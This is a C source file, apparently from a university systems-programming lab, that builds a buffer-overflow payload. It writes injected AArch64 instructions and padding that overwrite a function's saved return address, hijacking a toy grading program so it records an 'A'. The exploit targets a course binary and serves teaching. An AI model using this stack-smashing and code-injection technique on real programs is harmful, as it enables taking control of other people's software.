/*--------------------------------------------------------------------*/
/* createdataA.c                                                      */
/* Author: Ariel Yuan, Grace Best.                                    */
/* Purpose: Produces a file called dataA with the student name, a     */
/* nullbyte, the address of the malicious instruction in an array     */
/* element of name[] to get an A, padding to overrun the stack, the   */
/* ladder of which will overwrite getName's stored x30.               */
/*--------------------------------------------------------------------*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include "miniassembler.h"
#include "miniassembler.c"

/* Writes to file dataA the name of student, the null byte, 
   machine code versions of malicious instructions, and lastly 
   the address of the array element storing the first malicious
   instruction. Returns 0.*/
int main(void)
{
   int i;
   FILE *psFILE;
   unsigned int ulData;  /* Machine code instructions */
   unsigned long addr = 0x420060;  /* Address of A instruction */

   psFILE = fopen("dataA", "w");
   fprintf(psFILE, "Grace");   /* Write our names to file */
   fprintf(psFILE, "%c", '\0');     /* Write null byte after name */

   /*padding to an address that is a multiple of 4*/
   for (i = 0; i < 2; i++)
   {
      fprintf(psFILE, "%c", '\0');
   }

   /* mov x1, 'A' */
   ulData = MiniAssembler_mov(0, 'A');
   (void)fwrite(&ulData, sizeof(unsigned int), 1, psFILE);
    
   /* adr x0, grade */
   ulData = MiniAssembler_adr(1, 0x420044, addr + 4);
   (void)fwrite(&ulData, sizeof(unsigned int), 1, psFILE);

   /*str x1, [x0]*/
   ulData = MiniAssembler_strb(0, 1);
   (void)fwrite(&ulData, sizeof(unsigned int), 1, psFILE);
   
   /* b 0x40089c */
   ulData = MiniAssembler_b(0x40089c, addr + 12);
   (void)fwrite(&ulData, sizeof(unsigned int), 1, psFILE);

   /* Write padding of 24 characters to overrun stack */
   for (i = 0; i < 24; i++)
   {
      fprintf(psFILE, "%c", '\0');
   }
   /* Overwrite getName's stored x30 w/ instruction to get a A */
   (void)fwrite(&addr, sizeof(unsigned long), 1, psFILE);


   fclose(psFILE);
   return 0;
}
